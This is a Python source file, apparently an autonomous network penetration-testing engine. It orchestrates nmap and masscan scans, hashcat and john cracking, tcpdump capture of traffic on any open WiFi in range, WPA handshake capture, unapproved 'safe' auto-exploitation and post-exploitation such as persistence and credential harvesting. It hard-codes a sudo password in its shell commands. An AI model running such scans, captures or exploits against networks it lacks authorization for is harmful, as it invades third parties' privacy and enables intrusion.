            result = subprocess.run(
                ["pgrep", "-f", "ollama"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                pids = result.stdout.strip().split("\n")
                for pid_str in pids:
                    if pid_str.strip():
                        pid = int(pid_str.strip())
                        os.kill(pid, signal.SIGSTOP)
                        self._ollama_pid = pid
                        self._ollama_was_running = True
                        logger.info(f"Paused Ollama (PID {pid}) for GPU cracking")
                        return True
        except Exception as e:
            logger.warning(f"Could not pause Ollama: {e}")
        return False

    async def _resume_ollama(self):
        """Resume Ollama after cracking."""
        if self._ollama_pid and self._ollama_was_running:
            try:
                os.kill(self._ollama_pid, signal.SIGCONT)
                logger.info(f"Resumed Ollama (PID {self._ollama_pid})")
            except Exception as e:
                logger.warning(f"Could not resume Ollama: {e}")
            self._ollama_pid = None
            self._ollama_was_running = False

    async def start_crack(self, hash_file: str, tool: str = "john", gpu: bool = False) -> CrackSession:
        """Start a cracking session."""
        session = CrackSession(
            tool=tool,
            hash_file=hash_file,
            gpu_mode=gpu,
            status="starting",
        )

        if gpu and tool == "hashcat":
            await self._pause_ollama()

        self._crack_sessions.append(session)
        self._stats["cracks_run"] += 1

        # Build command
        if tool == "john":
            cmd = f"john {hash_file}"
        elif tool == "hashcat":
            mode = "0"  # default hash mode
            cmd = f"hashcat -m {mode} {hash_file} /usr/share/wordlists/rockyou.txt"
        else:
            cmd = f"{tool} {hash_file}"

        session.status = "running"
        session.started_at = time.time()

        # Run in background
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            session.pid = proc.pid
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=3600)
            session.result = stdout.decode("utf-8", errors="replace")
            session.status = "completed"
            session.completed_at = time.time()
        except asyncio.TimeoutError:
            session.status = "timeout"
            session.result = "Cracking session timed out after 1 hour"
            try:
                if proc and proc.returncode is None:
                    proc.kill()
                    await proc.wait()
                    logger.info(f"Killed orphaned cracking process PID={session.pid}")
            except Exception:
                pass
        except Exception as e:
            session.status = "error"
            session.result = str(e)
        finally:
            if gpu:
                await self._resume_ollama()

        self.create_notification(
            NotificationType.CRACK_COMPLETE,
            "Cracking Complete",
            f"Tool: {tool}, Status: {session.status}",
            target=hash_file,
        )

        return session

    # ── Exploit Prioritization ────────────────────────────────

    def prioritize_exploits(self) -> List[ExploitTask]:
        """Sort exploit queue by priority and CVSS score."""
        pending = [
            t for t in self._exploit_queue
            if t.auth_status in (AuthStatus.PENDING, AuthStatus.APPROVED)
            and not t.executed
        ]
        pending.sort(key=lambda t: (-t.priority, -t.cvss))
        return pending

    async def execute_authorized_exploits(self, shell_agent):
        """Execute all authorized exploits."""
        for task in self.prioritize_exploits():
            if task.auth_status == AuthStatus.APPROVED:
                self._state = TamaState.EXPLOITING
                logger.info(f"Executing authorized exploit: {task.command}")

                from agents.base import AgentMessage
                msg = AgentMessage(
                    sender="tamagotchi",
                    receiver="Shell",
                    content=f"!{task.command}",
                    metadata={"tamagotchi_exploit": True, "task_id": task.id},
                )
                result = await shell_agent.handle(msg)
                task.executed = True
                task.result = result.content
                self._stats["exploits_executed"] += 1

                self.log_knowledge(
                    "exploit",
                    task.exploit_name or task.command[:100],
                    {"target": task.target, "result": result.content[:500]},
                    source="tamagotchi",
                )

    # ── Learning from Discoveries ──────────────────────────────

    def learn_from_device(self, device: Dict[str, Any]):
        """Extract and store knowledge from a discovered device."""
        ip = device.get("ip", "")
        services = device.get("services", [])

        for svc in services:
            name = svc.get("name", "")
            version = svc.get("version", "")

            if version:
                self.log_knowledge(
                    "service_version",
                    f"{ip}:{svc.get('port')}",
                    {"service": name, "version": version},
                    source="sentient",
                )

            # Check for known vulnerable versions
            if name in ("http", "https") and version:
                self.log_knowledge(
                    "web_service",
                    ip,
                    {"port": svc.get("port"), "version": version},
                    source="sentient",
                )

        # Log the device itself
        self.log_knowledge(
            "device",
            ip,
            {
                "hostname": device.get("hostname", ""),
                "type": device.get("device_type", "unknown"),
                "services": len(services),
            },
            source="sentient",
        )

    # ── Prompt Suggestions ────────────────────────────────────

    def get_prompt_suggestions(self) -> List[Dict[str, str]]:
        """Get contextual prompt suggestions based on current state."""
        suggestions = []

        # Always-available suggestions
        suggestions.extend([
            {"text": "Scan my network", "category": "recon", "icon": "radar"},
            {"text": "Show discovered devices", "category": "recon", "icon": "list"},
            {"text": "Generate network map", "category": "recon", "icon": "map"},
            {"text": "Check system health", "category": "system", "icon": "heart"},
            {"text": "List all agents", "category": "system", "icon": "users"},
        ])

        # Context-aware suggestions based on state
        if self._stats["devices_found"] > 0:
            suggestions.extend([
                {"text": "Pentest all discovered devices", "category": "pentest", "icon": "crosshair"},
                {"text": "Enumerate services on all targets", "category": "recon", "icon": "scan"},
                {"text": "Search for known CVEs", "category": "vuln", "icon": "bug"},
            ])

        if self._stats["vulns_found"] > 0:
            suggestions.extend([
                {"text": "Prioritize exploits by severity", "category": "exploit", "icon": "fire"},
                {"text": "Generate vulnerability report", "category": "report", "icon": "file"},
                {"text": "Show pending authorizations", "category": "tamagotchi", "icon": "shield"},
            ])

        pending = sum(1 for n in self._notifications if n.needs_auth and n.auth_status == AuthStatus.PENDING)
        if pending > 0:
            suggestions.append(
                {"text": f"Review {pending} pending authorization(s)", "category": "tamagotchi", "icon": "alert"}
            )

        # Knowledge-based suggestions
        knowledge_stats = self.get_knowledge_stats()
        if knowledge_stats:
            suggestions.append(
                {"text": "What do we know about [target]?", "category": "knowledge", "icon": "brain"}
            )

        return suggestions

    # ── Main Autonomous Loop ──────────────────────────────────

    async def start(self, scan_interval: int = 600):
        """Start the autonomous loop."""
        if self._running:
            return
        self._running = True
        self._paused = False
        self._state = TamaState.IDLE
        logger.info(f"Tamagotchi engine started (interval: {scan_interval}s)")
        self._loop_task = asyncio.create_task(self._autonomous_loop(scan_interval))

    async def stop(self):
        """Stop the autonomous loop."""
        self._running = False
        self._paused = False
        self._state = TamaState.SLEEPING
        if self._loop_task:
            self._loop_task.cancel()
            try:
                await self._loop_task
            except asyncio.CancelledError:
                pass
        if self._scan_task and not self._scan_task.done():
            self._scan_task.cancel()
            try:
                await self._scan_task
            except asyncio.CancelledError:
                pass
        await self._resume_ollama()
        self.save_state()
        logger.info("Tamagotchi engine stopped")

    def pause(self):
        """Pause the autonomous loop."""
        if self._running and not self._paused:
            self._paused = True
            self._state = TamaState.SLEEPING
            self._think("Paused by user")
            logger.info("Tamagotchi engine paused")

    def resume(self):
        """Resume the autonomous loop."""
        if self._running and self._paused:
            self._paused = False
            self._state = TamaState.IDLE
            self._think("Resumed by user")
            logger.info("Tamagotchi engine resumed")

    def _think(self, thought: str):
        """Record a thought, log it, emit event, and broadcast to WebSocket clients."""
        self._current_thought = thought
        entry = {
            "thought": thought,
            "state": self._state.value,
            "phase": self._current_phase,
            "timestamp": time.time(),
        }
        self._thinking_log.append(entry)
        if len(self._thinking_log) > 200:
            self._thinking_log = self._thinking_log[-200:]
        self._emit_event("think", entry)
        self._broadcast_tama_event("tama_think", entry)
        logger.info(f"[TAMA THINK] {thought}")
        try:
            from avatar.engine import get_avatar_engine
            av = get_avatar_engine()
            state_map = {
                "idle": "idle", "scanning": "thinking", "mapping": "analyzing",
                "cracking": "thinking", "exploiting": "alert", "alert": "alert",
            }
            av_state = state_map.get(self._state.value, "thinking")
            av.set_state(av_state, animate=True)
            av.set_text_display(thought[:120])
        except Exception:
            pass

    async def _autonomous_loop(self, interval: int):
        """Main autonomous loop — FAST and AGGRESSIVE.
        Tamagotchi uses MAX speed scans. Jetson anonymity handled separately.
        Full pentester workflow:
        1.  Discover all networks (FAST)
        2.  WiFi recon — scan APs, test open/weak networks, capture traffic
        3.  Host discovery (FAST)
        4.  Service detection on each host (FAST)
        5.  OS detection (FAST)
        6.  Vulnerability analysis per device
        7.  Build topology
        8.  Passive OSINT (DNS, Shodan lookup)
        9.  Bluetooth scanning
        10. WiFi handshake capture + WPA crack
        11. Web application testing (Nikto, path discovery)
        12. AI-driven safe auto-exploitation (default creds, anon access, unauth services)
        13. Execute authorized exploits (user-approved)
        14. Post-exploitation (enum, privesc, persistence, credential harvest)
        15. Learning loop (success/failure rates, mistake tracking)
        16. Generate enhanced report (remediation, risk scores, attack paths) + index
        17. Persist & idle
        """
        while self._running:
            try:
                while self._paused and self._running:
                    await asyncio.sleep(1)
                if not self._running:
                    break

                from agents.sentient import get_sentient_engine
                sentient = get_sentient_engine()

                # ── Phase 1: Discover Networks (FAST) ──
                self._current_phase = "network_discovery"
                self._state = TamaState.SCANNING
                cycle_start = time.time()
                self._think("Phase 1: Discovering all networks [FAST]...")
                self._phase_progress = {"phase": "network_discovery", "progress": 0}

                await sentient._detect_our_interfaces()
                self._our_ip = sentient._our_ip
                self._our_mac = sentient._our_mac
                self._my_interfaces = dict(sentient._my_interfaces)
                self._wifi_interface = self._PRIMARY_WIFI
                networks = await sentient._detect_local_networks()
                self._phase_progress = {"phase": "network_discovery", "networks": len(networks), "progress": 100}

                for cidr in networks:
                    if cidr not in self._networks:
                        self._networks[cidr] = Network(cidr=cidr)
                        self._think(f"Found network: {cidr}")
                        self.award_xp("new_network_mapped", detail=cidr)

                self._stats["networks_analyzed"] = len(networks)
                self.log_knowledge("network_discovery", "all_networks", {
                    "networks": networks,
                    "our_ip": self._our_ip,
                }, source="fast_scan")

                # ── Phase 2: WiFi Recon + Handshakes ──
                self._current_phase = "wifi_recon"
                self._think("Phase 2: WiFi reconnaissance...")
                self._phase_progress = {"phase": "wifi_recon", "progress": 0}

                wifi_aps = await sentient._scan_wifi()
                self._phase_progress = {"phase": "wifi_recon", "aps_found": len(wifi_aps), "progress": 50}

                open_aps = [a for a in wifi_aps if a.encryption == "off"]
                weak_aps = [a for a in wifi_aps if a.encryption == "on" and a.signal > -60]

                new_open = [a for a in open_aps if a.bssid not in self._wifi_aps]
                if new_open:
                    self._stats["open_networks_found"] = self._stats.get("open_networks_found", 0) + len(new_open)
                    for ap in new_open:
                        self._think(f"OPEN NETWORK: {ap.ssid} ({ap.bssid}) — no encryption!")
                        self.create_notification(
                            NotificationType.ALERT,
                            f"Open WiFi: {ap.ssid}",
                            f"BSSID: {ap.bssid}, Signal: {ap.signal} dBm — NO ENCRYPTION",
                            severity="high",
                        )
                        self.award_xp("wifi_ap_found", detail=f"OPEN: {ap.ssid}")

                for ap in open_aps[:3]:
                    self._think(f"Capturing traffic from open network: {ap.ssid}...")
                    await self._capture_wifi_traffic(ap)

                for ap in weak_aps[:2]:
                    self._think(f"Testing weak network: {ap.ssid}...")
                    await self._test_wifi_security(ap)

                # Index all WiFi findings
                self.log_knowledge("wifi_recon", "all_aps", {
                    "total": len(wifi_aps),
                    "open": len(open_aps),
                    "strong": len(weak_aps),
                    "aps": [{"ssid": a.ssid, "bssid": a.bssid, "signal": a.signal, "enc": a.encryption} for a in wifi_aps],
                }, source="wifi_recon")

                # Copy WiFi APs to self and build incremental topology
                for ap in wifi_aps:
                    self._wifi_aps[ap.bssid] = ap
                self._build_topology()

                self._phase_progress = {"phase": "wifi_recon", "progress": 100}

                # ── Phase 3: Host Discovery (FAST) ──
                self._current_phase = "host_discovery"
                self._think(f"Phase 3: Fast host discovery on {len(networks)} network(s)...")
                all_hosts = []
                for i, cidr in enumerate(networks):
                    self._phase_progress = {"phase": "host_discovery", "network": cidr, "progress": int((i/len(networks))*100)}
                    hosts = await self._fast_discover(cidr)
                    all_hosts.extend(hosts)
                    self._think(f"Found {len(hosts)} hosts on {cidr}")

                self._stats["scans_run"] += 1
                self._streaks["scans"] = self._streaks.get("scans", 0) + 1
                self.award_xp("scan_complete", detail=f"{len(all_hosts)} hosts across {len(networks)} networks")

                # ── Phase 4: Service Detection (FAST, one host at a time) ──
                self._current_phase = "service_analysis"
                self._think(f"Phase 4: Fast service analysis on {len(all_hosts)} hosts...")
                new_devices = 0
                for i, host in enumerate(all_hosts):
                    if self._paused:
                        self._think("Paused during service analysis")
                        while self._paused and self._running:
                            await asyncio.sleep(1)

                    ip = host["ip"]
                    if ip in self._devices:
                        self._devices[ip].last_seen = time.time()
                        continue

                    self._phase_progress = {"phase": "service_analysis", "host": ip, "progress": int((i/len(all_hosts))*100), "total": len(all_hosts)}
                    self._think(f"Analysing {ip} ({i+1}/{len(all_hosts)})...")

                    services = await self._fast_service_scan(ip)
                    device = Device(
                        ip=ip,
                        hostname=host.get("hostname", ""),
                        services=services,
                    )
                    device.device_type = sentient._classify_device(device)
                    self._devices[ip] = device
                    new_devices += 1
                    self._stats["devices_found"] = len(self._devices)
                    self._build_topology()

                    self.learn_from_device(device.to_dict())

                    self.create_notification(
                        NotificationType.NEW_DEVICE,
                        f"New device: {ip}",
                        f"Hostname: {device.hostname or 'unknown'}, "
                        f"Type: {device.device_type.value}, "
                        f"Services: {len(services)}",
                        target=ip,
                        severity="info",
                    )
                    self.award_xp("device_discovered", detail=f"{ip} ({device.device_type.value})")

                    # Per-host vulnerability analysis
                    await self._analyze_device_vulns(device)

                    # Full port scan on interesting hosts (servers, routers)
                    if device.device_type in (DeviceType.SERVER, DeviceType.ROUTER) or len(services) > 3:
                        self._think(f"Deep port scan on {ip} (interesting host)...")
                        extra_ports = await self._fast_full_port_scan(ip)
                        known_ports = {s.port for s in services}
                        new_ports = [p for p in extra_ports if p not in known_ports]
                        if new_ports:
                            self._think(f"Found {len(new_ports)} additional ports on {ip}: {new_ports[:10]}")
                            # Scan new ports for services
                            for port in new_ports[:10]:
                                svc_stdout = await self._fast_nmap(
                                    f"nmap -sV -T4 -p {port} {ip}", timeout=30
                                )
                                for line in svc_stdout.split("\n"):
                                    if "/tcp" in line and "open" in line:
                                        parts = line.split()
                                        if len(parts) >= 3:
                                            svc_name = parts[2]
                                            svc_ver = " ".join(parts[3:]) if len(parts) > 3 else ""
                                            services.append(Service(port=port, protocol="tcp", name=svc_name, version=svc_ver))

                            self.log_knowledge("deep_port_scan", ip, {
                                "extra_ports": new_ports,
                                "total_ports": len(extra_ports),
                            }, source="fast_scan")
                            if not self._is_known_finding("deep_port_scan", f"done_{ip}"):
                                self.award_xp("full_port_scan", detail=f"{ip}: {len(extra_ports)} ports found")
                                self.log_knowledge("deep_port_scan", f"done_{ip}", {"ip": ip}, source="fast_scan")

                if new_devices > 0:
                    self._streaks["devices"] = self._streaks.get("devices", 0) + new_devices

                # ── Phase 5: OS Detection (FAST) ──
                self._current_phase = "os_detection"
                self._phase_progress = {"phase": "os_detection", "progress": 0, "total": len(all_hosts[:10])}
                for host_i, host in enumerate(all_hosts[:10]):
                    ip = host["ip"]
                    self._phase_progress = {"phase": "os_detection", "progress": int((host_i/len(all_hosts[:10]))*100), "host": ip}
                    if ip in self._devices and not self._devices[ip].os_guess:
                        self._think(f"Detecting OS on {ip}...")
                        os_guess = await self._fast_os_detect(ip)
                        if os_guess:
                            self._devices[ip].os_guess = os_guess
                            self._devices[ip].device_type = sentient._classify_device(self._devices[ip])
                            self.award_xp("os_identified", detail=f"{ip}: {os_guess[:40]}")

                # ── Phase 6: Targeted Vuln Scans on High-Value Targets ──
                self._current_phase = "vuln_scanning"
                self._think("Phase 6: Vulnerability scanning on high-value targets...")
                high_value = []
                for ip, dev in self._devices.items():
                    svc_names = {s.name.lower() for s in dev.services}
                    if any(s in svc_names for s in ["http", "https", "ssh", "ftp", "smb", "mysql", "redis", "telnet"]):
                        high_value.append(ip)

                self._phase_progress = {"phase": "vuln_scanning", "progress": 0, "total": len(high_value[:8])}
                for vuln_i, ip in enumerate(high_value[:8]):  # Limit to 8 targets
                    if self._paused:
                        while self._paused and self._running:
                            await asyncio.sleep(1)
                    self._phase_progress = {"phase": "vuln_scanning", "progress": int((vuln_i/len(high_value[:8]))*100), "host": ip}
                    self._think(f"Vuln scanning {ip}...")
                    vulns = await self._fast_vuln_scan(ip)
                    for v in vulns:
                        if v.get("confirmed"):
                            port_num = int(v.get("port", 0))
                            vuln_key = f"vuln_validated_{ip}_{port_num}_{v.get('name', '')}"
                            if not self._is_known_finding("vuln_validated", vuln_key):
                                self._create_vuln_notification(
                                    ip, port_num, "nmap_vuln", "high",
                                    f"Confirmed vulnerability on {ip}:{port_num}"
                                )
                                self.award_xp("vuln_validated", detail=f"{ip}:{port_num} {v.get('name', 'vuln')}")
                                self._stats["vulns_validated"] = self._stats.get("vulns_validated", 0) + 1
                                self.log_knowledge("vuln_validated", vuln_key, {"ip": ip, "port": port_num, "name": v.get('name', '')}, source="vuln_scan")

                # ── Phase 7: Build Topology ──
                self._current_phase = "topology"
                self._phase_progress = {"phase": "topology", "progress": 50}
                self._think("Building network topology...")
                self._build_topology()
                self._phase_progress = {"phase": "topology", "progress": 100}
                self.award_xp("topology_updated", detail=f"{len(self._topology.get('nodes',[]))} nodes, {len(self._topology.get('edges',[]))} edges")

                # ── Phase 8: Passive OSINT ──
                self._current_phase = "osint"
                self._phase_progress = {"phase": "osint", "progress": 0}
                self._think("Phase 8: Passive OSINT (DNS, Shodan)...")
                self._broadcast_tama_event("tama_phase", {"phase": "osint", "name": "Passive OSINT", "status": "running"})
                await self._passive_osint()
                self._phase_progress = {"phase": "osint", "progress": 100}

                # ── Phase 9: Bluetooth Scanning ──
                self._current_phase = "bluetooth"
                self._phase_progress = {"phase": "bluetooth", "progress": 0}
                self._think("Phase 9: Scanning Bluetooth devices...")
                self._broadcast_tama_event("tama_phase", {"phase": "bluetooth", "name": "Bluetooth Scan", "status": "running"})
                await self._scan_bluetooth()
                self._phase_progress = {"phase": "bluetooth", "progress": 100}

                # ── Phase 10: WiFi Handshake Capture ──
                self._current_phase = "handshake"
                self._phase_progress = {"phase": "handshake", "progress": 0}
                self._think("Phase 10: Attempting WiFi handshake capture...")
                self._state = TamaState.SCANNING
                self._broadcast_tama_event("tama_phase", {"phase": "handshake", "name": "Handshake Capture", "status": "running"})
                await self._capture_handshake()
                self._phase_progress = {"phase": "handshake", "progress": 100}

                # ── Phase 11: Web Application Testing ──
                self._current_phase = "web_testing"
                self._phase_progress = {"phase": "web_testing", "progress": 0}
                self._think("Phase 11: Web application testing...")
                self._broadcast_tama_event("tama_phase", {"phase": "web_testing", "name": "Web App Testing", "status": "running"})
                await self._test_web_apps()
                self._phase_progress = {"phase": "web_testing", "progress": 100}

                # ── Phase 12: AI-Driven Safe Auto-Exploitation ──
                self._current_phase = "auto_exploit"
                self._phase_progress = {"phase": "auto_exploit", "progress": 0}
                self._think("Phase 12: AI-driven safe auto-exploitation...")
                self._state = TamaState.EXPLOITING
                self._broadcast_tama_event("tama_phase", {"phase": "auto_exploit", "name": "Auto-Exploit", "status": "running"})
                await self._auto_exploit_safe()
                self._phase_progress = {"phase": "auto_exploit", "progress": 100}

                # ── Phase 13: Execute Authorized Exploits ──
                self._current_phase = "exploitation"
                authorized = [
                    t for t in self._exploit_queue
                    if t.auth_status == AuthStatus.APPROVED and not t.executed
                ]
                self._phase_progress = {"phase": "exploitation", "progress": 0, "authorized": len(authorized)}
                if authorized:
                    self._think(f"Executing {len(authorized)} authorized exploit(s)...")
                    self._state = TamaState.EXPLOITING
                    self._broadcast_tama_event("tama_phase", {"phase": "exploitation", "name": "Exploitation", "status": "running", "count": len(authorized)})
                self._phase_progress = {"phase": "exploitation", "progress": 100}

                # ── Phase 14: Post-Exploitation ──
                self._current_phase = "post_exploit"
                self._phase_progress = {"phase": "post_exploit", "progress": 0}
                self._think("Phase 14: Post-exploitation enumeration...")
                self._broadcast_tama_event("tama_phase", {"phase": "post_exploit", "name": "Post-Exploit", "status": "running"})
                await self._post_exploit()
                self._phase_progress = {"phase": "post_exploit", "progress": 100}

                # ── Phase 15: Learning Loop ──
                self._current_phase = "learning"
                self._phase_progress = {"phase": "learning", "progress": 50}
                self._think("Phase 15: Updating learning metrics...")
                self._update_learning()
                self._phase_progress = {"phase": "learning", "progress": 100}

                # ── Phase 16: Generate Enhanced Report + Full Index ──
                self._current_phase = "reporting"
                self._phase_progress = {"phase": "reporting", "progress": 0}
                self._think("Generating enhanced report and indexing all findings...")
                self._broadcast_tama_event("tama_phase", {"phase": "reporting", "name": "Reporting", "status": "running"})
                await self._generate_enhanced_report()
                await self._index_all_findings()
                self._phase_progress = {"phase": "reporting", "progress": 100}
                self.award_xp("report_generated", detail=f"{self._stats['devices_found']} devices, {self._stats['vulns_found']} vulns")
                self._stats["reports_generated"] = self._stats.get("reports_generated", 0) + 1

                # ── Phase 17: Persist & Idle ──
                self._current_phase = "idle"
                self._state = TamaState.IDLE
                self._stats["cycle_count"] = self._stats.get("cycle_count", 0) + 1
                cycle_elapsed = time.time() - cycle_start
                self._think(f"Cycle complete ({int(cycle_elapsed)}s). {self._stats['devices_found']} devices, {self._stats['vulns_found']} vulns, Level {self._level}.")
                self._phase_progress = {"phase": "idle", "progress": 100}
                self._broadcast_tama_event("tama_phase", {"phase": "idle", "name": "Idle", "status": "complete"})
                await self._index_all_findings()
                self.save_state()

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Tamagotchi loop error: {e}", exc_info=True)
                self._state = TamaState.ALERT
                self._think(f"Error: {e}")

            # Wait between cycles (check for pause)
            for _ in range(interval):
                if self._paused or not self._running:
                    break
                await asyncio.sleep(1)

    # ── Fast Scan Engine (bypasses stealth — MAX speed) ───────

    async def _fast_nmap(self, cmd: str, timeout: float = 120.0) -> str:
        """Run nmap at maximum speed, no stealth. Returns stdout."""
        import shutil as _shutil
        if _shutil.which("sudo") and os.path.exists("/etc/shadow"):
            full_cmd = f"echo jetson | sudo -S {cmd} 2>/dev/null"
        else:
            full_cmd = cmd
        proc = None
        try:
            proc = await asyncio.create_subprocess_shell(
                full_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode("utf-8", errors="replace")
        except asyncio.TimeoutError:
            if proc and proc.returncode is None:
                proc.kill()
                await proc.wait()
            return ""
        except Exception:
            if proc and proc.returncode is None:
                proc.kill()
                await proc.wait()
            return ""

    async def _fast_discover(self, cidr: str) -> List[Dict[str, str]]:
        """Ultra-fast host discovery — nmap -sn -T4, no stealth."""
        self._think(f"Fast discovery on {cidr}...")
        stdout = await self._fast_nmap(f"nmap -sn -T4 --max-rate 10000 {cidr}", timeout=90)

        hosts = []
        current_ip = None
        for line in stdout.split("\n"):
            line = line.strip()
            if "Nmap scan report for" in line:
                parts = line.replace("Nmap scan report for ", "")
                if "(" in parts:
                    hostname = parts.split("(")[0].strip()
                    ip = parts.split("(")[1].rstrip(")")
                else:
                    hostname = ""
                    ip = parts.strip()
                current_ip = ip
                hosts.append({"ip": ip, "hostname": hostname})
            elif "Host is up" in line and current_ip:
                hosts[-1]["up"] = True

        self.log_knowledge("scan_result", f"discovery_{cidr}", {
            "hosts_found": len(hosts),
            "ips": [h["ip"] for h in hosts],
            "command": f"nmap -sn -T4 {cidr}",
        }, source="fast_scan")
        return hosts

    async def _fast_service_scan(self, ip: str) -> List["Service"]:
        """Fast service detection — nmap -sV -T4 on top 10000 ports."""
        stdout = await self._fast_nmap(
            f"nmap -sV -T4 --version-intensity 3 --top-ports 10000 --max-rate 10000 {ip}",
            timeout=120
        )

        services = []
        for line in stdout.split("\n"):
            line = line.strip()
            if "/tcp" in line or "/udp" in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0]
                    port_num = int(port_proto.split("/")[0])
                    protocol = port_proto.split("/")[1]
                    state = parts[1]
                    if state == "open":
                        name = parts[2] if len(parts) > 2 else ""
                        version = " ".join(parts[3:]) if len(parts) > 3 else ""
                        services.append(Service(
                            port=port_num,
                            protocol=protocol,
                            name=name,
                            version=version,
                        ))

        # Index result for LLM
        self.log_knowledge("service_scan", ip, {
            "services": [{"port": s.port, "name": s.name, "version": s.version} for s in services],
            "command": f"nmap -sV -T4 {ip}",
        }, source="fast_scan")
        return services

    async def _fast_vuln_scan(self, target: str, ports: str = "") -> List[Dict[str, Any]]:
        """Fast vulnerability scan — nmap --script vuln -T4."""
        port_flag = f"-p {ports}" if ports else ""
        stdout = await self._fast_nmap(
            f"nmap --script vuln -T4 --max-rate 5000 {port_flag} --script-timeout 15 {target}",
            timeout=300
        )

        vulns = []
        current_vuln = {}
        for line in stdout.split("\n"):
            line = line.strip()
            if line.startswith("|"):
                vuln_text = line.lstrip("| ").strip()
                if vuln_text:
                    if current_vuln:
                        current_vuln.setdefault("details", []).append(vuln_text)
            elif "VULNERABLE" in line or "vulnerable" in line:
                current_vuln["confirmed"] = True
            elif "/tcp" in line and ("open" in line):
                if current_vuln:
                    vulns.append(current_vuln)
                current_vuln = {"port": line.split("/")[0], "line": line}

        if current_vuln:
            vulns.append(current_vuln)

        self.log_knowledge("vuln_scan", target, {
            "vulns_found": len(vulns),
            "vulns": vulns,
            "command": f"nmap --script vuln -T4 {target}",
        }, source="fast_scan")
        return vulns

    async def _fast_os_detect(self, ip: str) -> str:
        """Fast OS detection — nmap -O -T4."""
        stdout = await self._fast_nmap(
            f"nmap -O --osscan-guess -T4 {ip}", timeout=60
        )
        for line in stdout.split("\n"):
            if "OS details" in line or "Running:" in line:
                result = line.split(":", 1)[-1].strip() if ":" in line else line.strip()
                self.log_knowledge("os_detection", ip, {
                    "os": result,
                    "command": f"nmap -O -T4 {ip}",
                }, source="fast_scan")
                return result
        return ""

    async def _fast_full_port_scan(self, ip: str) -> List[int]:
        """Fast full port scan — masscan 1-65535 at 10000 pps."""
        stdout = await self._fast_nmap(
            f"masscan -p1-65535 --rate=10000 --open -oG - {ip}",
            timeout=90
        )
        open_ports = []
        for line in stdout.split("\n"):
            line = line.strip()
            if "Ports:" in line:
                import re
                ports_match = re.findall(r'(\d+)/open', line)
                open_ports = [int(p) for p in ports_match]
        if not open_ports:
            stdout2 = await self._fast_nmap(
                f"nmap -p- -T4 --max-rate 5000 --open {ip}", timeout=90
            )
            for line in stdout2.split("\n"):
                line = line.strip()
                if "/tcp" in line and "open" in line:
                    port = int(line.split("/")[0])
                    open_ports.append(port)
        return open_ports

    # ── WiFi Traffic Capture ─────────────────────────────────

    async def _capture_wifi_traffic(self, ap):
        """Capture traffic from an open WiFi network (no auth needed — passive)."""
        try:
            iface = "wlxc4e984dfb30f"
            ssid_safe = (ap.ssid or "unknown").replace(" ", "_").replace("/", "_")[:20]
            outfile = f"/tmp/wifi_capture_{ssid_safe}_{int(time.time())}"
            # Passive capture — just listen, no injection
            cmd = (
                f"echo jetson | sudo -S timeout 30 tcpdump -i {iface} "
                f"-w {outfile}.pcap -c 500 "
                f"not arp and not multicast 2>/dev/null"
            )
            self._think(f"Passive capture on {ap.ssid or ap.bssid}...")
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            try:
                await asyncio.wait_for(proc.communicate(), timeout=35)
            except asyncio.TimeoutError:
                if proc.returncode is None:
                    proc.kill()
                    await proc.wait()

            # Check if we got a file
            import os
            pcap = f"{outfile}.pcap"
            if os.path.exists(pcap) and os.path.getsize(pcap) > 0:
                cap_key = f"capture_{ap.bssid}"
                if not self._is_known_finding("wifi_capture", cap_key):
                    self._think(f"Captured traffic from {ap.ssid or ap.bssid}")
                    self.log_knowledge("wifi_capture", cap_key, {
                        "ssid": ap.ssid, "signal": ap.signal, "pcap": pcap,
                        "size": os.path.getsize(pcap),
                    }, source="passive_capture")
                    self.award_xp("wifi_traffic_captured", detail=f"{ap.ssid}")
            else:
                self._think(f"No traffic captured from {ap.ssid or ap.bssid}")
        except Exception as e:
            logger.warning(f"WiFi capture failed: {e}")

    async def _test_wifi_security(self, ap):
        """Test WiFi network security (passive — check encryption, not crack)."""
        try:
            self._think(f"Testing security of {ap.ssid or ap.bssid}...")
            # Log encryption info
            self.log_knowledge("wifi_security", ap.bssid, {
                "ssid": ap.ssid,
                "encryption": ap.encryption,
                "signal": ap.signal,
                "channel": ap.channel,
                "risk": "open" if ap.encryption == "off" else "encrypted",
            }, source="security_test")

            if ap.encryption == "off":
                self._think(f"UNSECURED: {ap.ssid} — no encryption!")
                self._create_vuln_notification(ap.bssid.replace(":", ""), 0, "open_wifi", "high",
                    f"Open WiFi network: {ap.ssid} ({ap.bssid}) — no encryption, all traffic visible")
            else:
                self._think(f"Network {ap.ssid} uses {ap.encryption} encryption")
        except Exception as e:
            logger.warning(f"WiFi security test failed: {e}")

    # ── Per-Device Vulnerability Analysis ───────────────────

    async def _analyze_device_vulns(self, device):
        """Analyze a single device for vulnerabilities."""
        ip = device.ip
        hostname = device.hostname or ""
        dev_type = device.device_type.value
        new_vulns = 0

        if len(device.services) > 3:
            enum_key = f"enum_{ip}_{len(device.services)}"
            if not self._is_known_finding("service_enum", enum_key):
                self.award_xp("service_enum_deep", detail=f"{ip}: {len(device.services)} services")
                self.log_knowledge("service_enum", enum_key, {"ip": ip, "count": len(device.services)}, source="auto_analysis")

        for svc in device.services:
            port = svc.port
            name = svc.name.lower() if svc.name else ""
            version = svc.version or ""
            is_new = False
            severity = "info"

            # Telnet (plaintext)
            if name == "telnet" or port == 23:
                self._think(f"⚠️ Telnet on {ip}:{port} — plaintext, sniffable")
                is_new = self._create_vuln_notification(ip, port, "telnet_exposure", "high",
                    f"Telnet on {ip}:{port} — credentials in plaintext")
                severity = "high"

            # FTP
            elif name == "ftp" or port == 21:
                self._think(f"FTP on {ip}:{port} — checking for anon access...")
                is_new = self._create_vuln_notification(ip, port, "ftp_anon", "medium",
                    f"FTP on {ip}:{port} — check anonymous login")
                if is_new:
                    self.award_xp("service_exploited", detail=f"FTP on {ip}:{port}")
                severity = "medium"

            # SSH
            elif name == "ssh" or port == 22:
                if version and "OpenSSH" in version:
                    try:
